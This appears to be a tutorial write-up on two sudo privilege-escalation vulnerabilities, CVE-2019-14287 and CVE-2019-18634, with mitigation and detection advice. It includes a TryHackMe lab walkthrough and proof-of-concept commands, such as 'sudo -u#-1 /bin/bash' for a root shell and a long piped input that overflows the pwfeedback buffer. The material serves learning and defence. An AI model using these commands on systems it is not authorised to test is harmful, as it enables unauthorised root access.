# Sudo CVEs

In this article, we will discuss sudo CVEs, specifically `CVE-2019-14287` and `CVE-2019-18634`, and how they allow us to achieve sudo privilege escalation on Linux systems.  

## **CVE-2019-14287**

CVE-2019-14287 is a vulnerability in `sudo` that allows a user with restricted privileges to execute arbitrary commands as **root**, even if they are explicitly denied in the `sudoers` file. This occurs due to improper validation of the user ID (`UID`) when running commands.

---

## **Details of the Vulnerability**

1. **Affected Software**:
    - `sudo` versions prior to **1.8.28**.
    
1. **Vulnerability Description**:
    - When `sudo` is configured to allow a user to execute commands as any user **except root** using the `!ALL` directive in the `sudoers` file, the vulnerability allows bypassing this restriction.
    - The issue arises because `sudo` does not properly handle the `-1` or `4294967295` value for the `UID`. Internally, these values are interpreted as `0` (root).
2. **Exploitation**:
    - A user can exploit this by specifying `-u#-1` to execute a command as root, bypassing the restrictions.

---

## **Proof of Concept (PoC)**

### 1. Vulnerable Configuration in `/etc/sudoers`:

The following configuration denies a user (`exampleuser`) from executing commands as root:

```plaintext
exampleuser ALL=(ALL,!root) ALL
```

### 2. Exploit Command:

The attacker can bypass the restriction and run commands as root:

```bash
sudo -u#-1 id
```

### 3. Expected Output:

The command will execute as root (`UID=0`):

```plaintext
uid=0(root) gid=0(root) groups=0(root)
```

---

## **Impact**

- **Privilege Escalation**: The attacker gains root privileges, bypassing intended restrictions.
- **Severity**: High (CVSS Score: 7.8).

---

## **Mitigation**

1. **Update `sudo`**:
    
    - Upgrade to **sudo 1.8.28** or later, which properly validates `UID` values.
    
    ```bash
    sudo apt update && sudo apt install sudo
    ```
    
2. **Audit and Restrict sudoers Configuration**:
    
    - Ensure your `sudoers` file does not rely solely on `!root` for user restrictions.
3. **Monitor and Log sudo Usage**:
    
    - Use logs to monitor unusual activity involving `sudo`.

### TryHackMe Lab 

Now that we have access to the machine, our next goal is to gain root privileges using the identified vulnerability.

First, we use the command `sudo -l` to check what commands we can execute with the current user.

After running `sudo -l`, we see that we can run `/bin/bash` as another user except for root. Letâ€™s exploit this vulnerability.

```shell
sudo -u#-1 /bin/bash
```

And just like that, we are now the root user! :

# **CVE-2019-18634**

CVE-2019-18634 is a **buffer overflow vulnerability** in `sudo` that can allow local privilege escalation. It specifically affects `sudo` configurations where **pwfeedback** is enabled, which can result in memory corruption and potentially lead to unauthorized code execution or system crashes.

---

## **Details of the Vulnerability**

1. **Affected Software**:
    
    - `sudo` versions prior to **1.8.31**.
    - Only configurations with **pwfeedback** enabled are affected.
2. **Vulnerability Description**:
    
    - The **pwfeedback** option, which provides visual feedback when typing a password (e.g., asterisks), is susceptible to a buffer overflow.
    - If the input exceeds the buffer size, it overflows, corrupting memory.
    - The issue is exploitable only when the attacker provides their own password input, making it a local attack vector.
3. **Exploitation**:
    
    - By triggering the buffer overflow, an attacker can potentially execute arbitrary code or crash the `sudo` process.

---

## **Proof of Concept (PoC)**

### 1. Vulnerable Configuration:

The `/etc/sudoers` file must have **pwfeedback** enabled:

```plaintext
Defaults pwfeedback
```

### 2. Exploit Steps:

- Use a specially crafted input (e.g., very long password) to overflow the buffer.
- For example:
    
    ```bash
    python3 -c "print('A' * 10000)" | sudo -S id
    ```
    
- This may result in a segmentation fault or allow further exploitation.

### 3. Output:

If the system is vulnerable, it could crash with a segmentation fault:

```plaintext
Segmentation fault (core dumped)
```

---

## **Impact**

- **Privilege Escalation**: Potential execution of arbitrary code with root privileges.
- **Denial of Service**: Crash or instability of the `sudo` process.
- **Severity**: High (CVSS Score: 7.8).

---

## **Mitigation**

1. **Update `sudo`**:
    
    - Upgrade to `sudo` version **1.8.31** or later, where the issue is patched:
        
        ```bash
        sudo apt update && sudo apt install sudo
        ```
        
2. **Disable pwfeedback**:
    
    - Ensure the `pwfeedback` option is not enabled in `/etc/sudoers`:
        
        ```plaintext
        Defaults !pwfeedback
        ```
        
3. **Apply Principle of Least Privilege**:
    
    - Limit sudo access to necessary users and monitor suspicious activity.

---

## **Detection**

1. **Check sudo Version**:
    
    ```bash
    sudo --version
    ```
    
2. **Search for pwfeedback in sudoers**:
    
    ```bash
    sudo grep pwfeedback /etc/sudoers /etc/sudoers.d/*
    ```
